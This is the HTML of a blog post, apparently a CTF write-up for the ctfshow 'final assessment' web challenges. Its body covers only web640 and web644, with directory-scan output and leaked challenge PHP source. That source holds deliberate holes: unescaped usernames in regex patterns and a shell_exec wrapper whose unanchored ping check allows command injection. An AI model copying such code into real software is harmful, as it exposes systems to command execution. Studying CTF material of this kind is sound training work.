<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="考核我的内网渗透？">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow终极考核">
<meta property="og:url" content="https://baozongwi.xyz/posts/f8e94762.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="考核我的内网渗透？">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieves/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ20240924-140925.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieves/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ20240924-172640.png">
<meta property="article:published_time" content="2024-09-24T04:16:07.000Z">
<meta property="article:modified_time" content="2025-08-08T03:56:49.714Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="php">
<meta property="article:tag" content="mysql">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieves/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ20240924-140925.png">


<link rel="canonical" href="https://baozongwi.xyz/posts/f8e94762.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/f8e94762.html","path":"posts/f8e94762.html","title":"ctfshow终极考核"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow终极考核 | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web640"><span class="nav-number">1.</span> <span class="nav-text">web640</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web644"><span class="nav-number">2.</span> <span class="nav-text">web644</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web642"><span class="nav-number">3.</span> <span class="nav-text">web642</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web641"><span class="nav-number">4.</span> <span class="nav-text">web641</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web643"><span class="nav-number">5.</span> <span class="nav-text">web643</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web645"><span class="nav-number">6.</span> <span class="nav-text">web645</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web646"><span class="nav-number">7.</span> <span class="nav-text">web646</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web647"><span class="nav-number">8.</span> <span class="nav-text">web647</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web648"><span class="nav-number">9.</span> <span class="nav-text">web648</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web649"><span class="nav-number">10.</span> <span class="nav-text">web649</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web650"><span class="nav-number">11.</span> <span class="nav-text">web650</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web651"><span class="nav-number">12.</span> <span class="nav-text">web651</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web652"><span class="nav-number">13.</span> <span class="nav-text">web652</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web653"><span class="nav-number">14.</span> <span class="nav-text">web653</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web654"><span class="nav-number">15.</span> <span class="nav-text">web654</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web655"><span class="nav-number">16.</span> <span class="nav-text">web655</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web656"><span class="nav-number">17.</span> <span class="nav-text">web656</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web657"><span class="nav-number">18.</span> <span class="nav-text">web657</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web658"><span class="nav-number">19.</span> <span class="nav-text">web658</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web659"><span class="nav-number">20.</span> <span class="nav-text">web659</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web665"><span class="nav-number">21.</span> <span class="nav-text">web665</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web660"><span class="nav-number">22.</span> <span class="nav-text">web660</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web661"><span class="nav-number">23.</span> <span class="nav-text">web661</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web662"><span class="nav-number">24.</span> <span class="nav-text">web662</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web663"><span class="nav-number">25.</span> <span class="nav-text">web663</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web664"><span class="nav-number">26.</span> <span class="nav-text">web664</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web665-1"><span class="nav-number">27.</span> <span class="nav-text">web665</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web666"><span class="nav-number">28.</span> <span class="nav-text">web666</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web667"><span class="nav-number">29.</span> <span class="nav-text">web667</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web668"><span class="nav-number">30.</span> <span class="nav-text">web668</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web669"><span class="nav-number">31.</span> <span class="nav-text">web669</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">32.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">33.</span> <span class="nav-text">小结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/f8e94762.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow终极考核 | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="考核我的内网渗透？">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow终极考核
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-09-24 12:16:07" itemprop="dateCreated datePublished" datetime="2024-09-24T12:16:07+08:00">2024-09-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 11:56:49" itemprop="dateModified" datetime="2025-08-08T11:56:49+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>111k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>3:04</span>
    </span>
</div>

            <div class="post-description">考核我的内网渗透？</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="web640"><a href="#web640" class="headerlink" title="web640"></a>web640</h1><p>进入就有<code>flag</code></p>
<h1 id="web644"><a href="#web644" class="headerlink" title="web644"></a>web644</h1><p>查看源码发现一个页面，但是这样子又跳转回去了，扫一下吧那</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[00:21:46] 200 -   43B  - /.bowerrc                                         </span><br><span class="line">[00:21:47] 200 -   34B  - /.gitignore                                       </span><br><span class="line">[00:21:49] 200 -    2KB - /.travis.yml                                      </span><br><span class="line">[00:22:06] 200 -    3KB - /page.php                                         </span><br><span class="line">[00:22:10] 200 -   19B  - /robots.txt </span><br></pre></td></tr></table></figure>

<p>然后拿到了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;娣诲姞鎴愬姛&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;鐢ㄦ埛宸插瓨鍦�&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;鏇存柊鎴愬姛&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;鐢ㄦ埛涓嶅瓨鍦ㄦ垨鏃犳潈鏇存柊&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;鍒犻櫎鎴愬姛&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;鐢ㄦ埛涓嶅瓨鍦ㄦ垨鏃犳潈鍒犻櫎&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>)?:<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>,<span class="string">&#x27;&lt;!-- ctfshow-web-cache --&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf cache.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> FLAG646;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;鍛戒护鎵ц澶辫触&#x27;</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">		<span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">		<span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就找不到了</p>
